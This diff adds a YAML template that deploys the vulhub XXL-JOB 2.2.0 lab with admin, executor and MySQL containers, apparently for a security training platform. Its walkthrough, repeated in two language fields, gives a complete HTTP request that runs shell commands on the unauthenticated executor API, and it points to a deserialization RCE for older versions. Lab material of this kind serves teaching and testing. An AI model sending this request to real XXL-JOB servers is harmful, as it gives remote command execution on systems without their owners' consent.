@@ -1,0 +1,162 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-xxl-job-unacc
+  name: XXL-JOB Executor Unauthorized Access
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - xxl-job
+  description: XXL-JOB — XXL-JOB Executor Unauthorized Access (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - auth-bypass
+    - xxl-job
+    difficulty: medium
+    summary: XXL-JOB Executor Unauthorized Access
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc
+        XXL-JOB is a distributed task scheduling platform with core design goals of rapid development, simple learning, lightweight, and easy extensibility. It is now open source and has been integrated into many companies' production lines, ready to use out of the box.
+        XXL-JOB is divided into two parts: admin and executor, where the former is the backend management page and the latter is the task execution client. The executor has no authentication configured by default, allowing unauthorized attackers to execute arbitrary commands through the RESTful API.
+        References:
+        - <https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g>
+        - <https://landgrey.me/blog/18/>
+        - <https://github.com/OneSourceCat/XxlJob-Hessian-RCE>
+        # Environment Setup
+        Execute the following command to start XXL-JOB version 2.2.0:
+        $ docker compose up -d
+        After the environment is started, you can access the management end (admin) at `http://your-ip:8080` and the client end (executor) at `http://your-ip:9999`.
+        # Vulnerability Reproduction
+        Send the following data packet to the client (executor) to execute commands:
+        $ POST /run HTTP/1.1
+        $ Host: your-ip:9999
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+        $ Connection: close
+        $ Content-Type: application/json
+        $ Content-Length: 365
+        $ {
+        $   "jobId": 1,
+        $   "executorHandler": "demoJobHandler",
+        $   "executorParams": "demoJobHandler",
+        $   "executorBlockStrategy": "COVER_EARLY",
+        $   "executorTimeout": 0,
+        $   "logId": 1,
+        $   "logDateTime": 1586629003729,
+        $   "glueType": "GLUE_SHELL",
+        $   "glueSource": "touch /tmp/success",
+        $   "glueUpdatetime": 1586699003758,
+        $   "broadcastIndex": 0,
+        $   "broadcastTotal": 0
+        $ }
+        The command `touch /tmp/success` has been successfully executed:
+        Additionally, for XXL-JOB versions below 2.2.0 that don't have a RESTful API, we can execute commands through Hessian deserialization (https://github.com/OneSourceCat/XxlJob-Hessian-RCE).
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc
+        XXL-JOB is a distributed task scheduling platform with core design goals of rapid development, simple learning, lightweight, and easy extensibility. It is now open source and has been integrated into many companies' production lines, ready to use out of the box.
+        XXL-JOB is divided into two parts: admin and executor, where the former is the backend management page and the latter is the task execution client. The executor has no authentication configured by default, allowing unauthorized attackers to execute arbitrary commands through the RESTful API.
+        References:
+        - <https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g>
+        - <https://landgrey.me/blog/18/>
+        - <https://github.com/OneSourceCat/XxlJob-Hessian-RCE>
+        # Environment Setup
+        Execute the following command to start XXL-JOB version 2.2.0:
+        $ docker compose up -d
+        After the environment is started, you can access the management end (admin) at `http://your-ip:8080` and the client end (executor) at `http://your-ip:9999`.
+        # Vulnerability Reproduction
+        Send the following data packet to the client (executor) to execute commands:
+        $ POST /run HTTP/1.1
+        $ Host: your-ip:9999
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+        $ Connection: close
+        $ Content-Type: application/json
+        $ Content-Length: 365
+        $ {
+        $   "jobId": 1,
+        $   "executorHandler": "demoJobHandler",
+        $   "executorParams": "demoJobHandler",
+        $   "executorBlockStrategy": "COVER_EARLY",
+        $   "executorTimeout": 0,
+        $   "logId": 1,
+        $   "logDateTime": 1586629003729,
+        $   "glueType": "GLUE_SHELL",
+        $   "glueSource": "touch /tmp/success",
+        $   "glueUpdatetime": 1586699003758,
+        $   "broadcastIndex": 0,
+        $   "broadcastTotal": 0
+        $ }
+        The command `touch /tmp/success` has been successfully executed:
+        Additionally, for XXL-JOB versions below 2.2.0 that don't have a RESTful API, we can execute commands through Hessian deserialization (https://github.com/OneSourceCat/XxlJob-Hessian-RCE).
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_8080
+    group:
+      fr: Accès
+      en: Access
+    label: admin 8080/tcp
+    type: port
+    default: 8080
+  - id: executor_port_9999
+    group:
+      fr: Accès
+      en: Access
+    label: executor 9999/tcp
+    type: port
+    default: 9999
+services:
+  admin:
+    role: main
+    image: vulhub/xxl-job
+    tag: 2.2.0-admin@sha256:866a03fa6b66feb502a9b51deb6b0a8fd5a9c2409415e55d9c6e861d5aea30b5
+    frozen: true
+    depends_on:
+    - db
+    ports:
+    - container: 8080
+      host: '{{ form.port_8080 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+  executor:
+    role: sidecar
+    image: vulhub/xxl-job
+    tag: 2.2.0-executor@sha256:4f30b45a326bc9928fe2f4adcf1e71030b6b5cc64a9e0e9406aabf5f11ca1c7d
+    frozen: true
+    depends_on:
+    - admin
+    ports:
+    - container: 9999
+      host: '{{ form.executor_port_9999 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+  db:
+    role: database
+    image: mysql
+    tag: 5.7@sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb
+    frozen: true
+    env:
+      MYSQL_ROOT_PASSWORD: root
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_8080 }}
